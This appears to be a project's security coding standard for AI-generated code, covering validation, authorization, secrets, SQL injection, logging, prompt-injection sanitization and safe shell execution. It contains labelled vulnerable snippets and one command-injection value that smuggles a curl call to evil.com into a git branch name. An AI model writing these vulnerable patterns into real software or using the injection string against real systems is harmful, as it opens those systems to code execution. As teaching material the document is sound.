# Nightgauge Security Standards

Security requirements that all AI-generated code must follow.

## Core Security Principles

1. **Defense in depth** - Multiple layers of security
2. **Least privilege** - Minimum access required
3. **Secure by default** - Safe defaults, explicit opt-in for risky behavior
4. **Fail securely** - Errors should not expose sensitive information

## Input Validation

### All External Input Must Be Validated

```typescript
// Good: Explicit validation
function createUser(input: unknown): User {
  const validated = userSchema.parse(input); // Throws on invalid
  return userRepository.create(validated);
}

// Bad: Trusting external input
function createUser(input: any): User {
  return userRepository.create(input); // No validation!
}
```

### Validation Rules

- Validate type, format, length, and range
- Use allowlists over blocklists
- Reject unexpected fields
- Sanitize before storage, escape before output

## Authentication & Authorization

### Authentication

- Use established authentication libraries (don't roll your own)
- Implement proper session management
- Use secure password hashing (bcrypt, argon2)
- Implement account lockout after failed attempts

### Authorization

- Check authorization on every request
- Use role-based or attribute-based access control
- Verify ownership for resource access
- Log authorization failures

```typescript
// Good: Explicit authorization check
async function getOrder(orderId: string, userId: string): Promise<Order> {
  const order = await orderRepository.findById(orderId);

  if (!order) {
    throw new NotFoundError("Order not found");
  }

  if (order.userId !== userId && !user.hasRole("admin")) {
    throw new ForbiddenError("Not authorized to view this order");
  }

  return order;
}
```

## Data Protection

### Sensitive Data Handling

- Identify and classify sensitive data
- Encrypt sensitive data at rest
- Use TLS for data in transit
- Minimize data collection and retention

### Secrets Management

```typescript
// Good: Environment variables
const apiKey = process.env.EXTERNAL_API_KEY;

// Bad: Hardcoded secrets
const apiKey = "sk-1234567890abcdef"; // Never do this!
```

- Never commit secrets to version control
- Use secret managers in production
- Rotate secrets regularly
- Never log secrets

## Database Security

### Parameterized Queries

```typescript
// Good: Parameterized query
const user = await db.query("SELECT * FROM users WHERE email = $1", [email]);

// Bad: String concatenation (SQL injection vulnerable)
const user = await db.query(`SELECT * FROM users WHERE email = '${email}'`);
```

### ORM Best Practices

```typescript
// Good: ORM with proper escaping
const user = await User.findOne({ where: { email } });

// Bad: Raw query with interpolation
const user = await sequelize.query(`SELECT * FROM users WHERE email = '${email}'`);
```

## API Security

### Request Validation

- Validate all request parameters
- Implement rate limiting
- Use HTTPS only
- Validate Content-Type headers

### Response Security

- Don't expose internal errors to clients
- Remove sensitive headers
- Implement proper CORS policies
- Use security headers (CSP, X-Frame-Options, etc.)

```typescript
// Good: Generic error to client, detailed log internally
catch (error) {
  logger.error('Database error', { error, userId });
  throw new InternalServerError('An error occurred');
}

// Bad: Exposing internal details
catch (error) {
  throw new Error(`Database connection failed: ${error.message}`);
}
```

## Logging & Monitoring

### What to Log

- Authentication attempts (success and failure)
- Authorization failures
- Input validation failures
- System errors

### What NOT to Log

- Passwords or credentials
- API keys or tokens
- Personal identifiable information (PII)
- Credit card numbers

```typescript
// Good: Sanitized logging
logger.info("User login attempt", { userId, success: true });

// Bad: Logging sensitive data
logger.info("User login", { userId, password, token });
```

## Dependency Security

- Keep dependencies updated
- Review dependencies before adding
- Use lockfiles for reproducible builds
- Run security audits regularly (`npm audit`, `pip-audit`, etc.)

## Security Checklist for Code Review

- [ ] Input validation on all external data
- [ ] No hardcoded secrets
- [ ] Parameterized database queries
- [ ] Proper authentication checks
- [ ] Authorization verified for resource access
- [ ] Sensitive data encrypted
- [ ] Error messages don't expose internals
- [ ] No sensitive data in logs
- [ ] Dependencies are up to date

## Prompt Injection Sanitization

Nightgauge includes a sanitization layer to protect against prompt injection
attacks in agentic workflows. This is critical when AI agents execute commands
based on potentially untrusted input (file contents, issue descriptions, etc.).

**See [docs/SECURITY.md](../docs/SECURITY.md) for complete documentation.**

### Quick Reference

| Feature             | Default  | Description                                |
| ------------------- | -------- | ------------------------------------------ |
| Output sanitization | Enabled  | Blocks dangerous Bash commands             |
| Input sanitization  | Disabled | Checks user prompts for injection attempts |
| Logging             | Enabled  | Records all sanitization events            |
| Warn-only mode      | Disabled | Logs without blocking (for testing)        |

### Configuration

Add to `.nightgauge/config.yaml`:

```yaml
sanitization:
  enabled: true
  warn_only: false
  allowlist:
    - "rm -rf ./node_modules"
```

### Environment Variables

- `NIGHTGAUGE_SKIP_SANITIZATION=1` - Disable sanitization
- `NIGHTGAUGE_SANITIZATION_WARN_ONLY=1` - Log but don't block

---

---

## Shell Command Execution Patterns

**Rule: Never interpolate user-controlled or external data into shell command strings.**

### The Vulnerability

Shell string interpolation passes the entire command through `/bin/sh`, which
interprets metacharacters. Even quoted variables can be exploited:

```typescript
// UNSAFE — shell interprets $(), backticks, ;, &&, | even inside quotes
await execAsync(`git branch -D "${branchName}"`);
// If branchName = 'x" && curl evil.com && echo "' → RCE
```

### The Safe Pattern

Use `execFileSync` / `execFile` with an array of arguments. The OS passes each
element as a discrete argument — no shell is involved, no metacharacters are
interpreted:

```typescript
// SAFE — no shell, arguments passed directly to the OS
execFileSync("git", ["branch", "-D", branchName], { cwd, stdio: "pipe" });
```

### Branch Name Validation (Defense in Depth)

Even with array arguments, validate branch names before use to catch malformed
input early and produce clear error messages:

```typescript
import { assertValidBranchName } from "./BranchNameValidator";

assertValidBranchName(branchName, "branchName");
assertValidBranchName(baseBranch, "baseBranch");

execFileSync("git", ["worktree", "add", worktreePath, "-b", branchName, `origin/${baseBranch}`], {
  cwd: repoRoot,
  stdio: "pipe",
});
```

The validator uses an allowlist: only `[a-zA-Z0-9\-_/.]` are permitted.
Dangerous characters (`$`, `` ` ``, `;`, `&`, `|`, `>`, `<`, spaces, `@{`,
`..`, etc.) cause an immediate rejection.

### When Shell Strings Are Unavoidable

For legacy code that must use shell strings (e.g., AI-generated content passed
to `gh` CLI), escape inside double quotes. This is defense-in-depth only —
prefer array arguments whenever possible:

```typescript
// Less preferred — only for AI-generated/trusted content, never for user input
execSync(`gh issue create --title "${escapeShell(title)}"`, { ... });
```

### Reference

- `packages/nightgauge-vscode/src/utils/BranchNameValidator.ts` — allowlist validator
- `packages/nightgauge-vscode/src/utils/WorktreeManager.ts` — safe pattern example
- Issue #2491 — original vulnerability report and fix

**Source:** [Nightgauge](https://github.com/nightgauge/nightgauge)
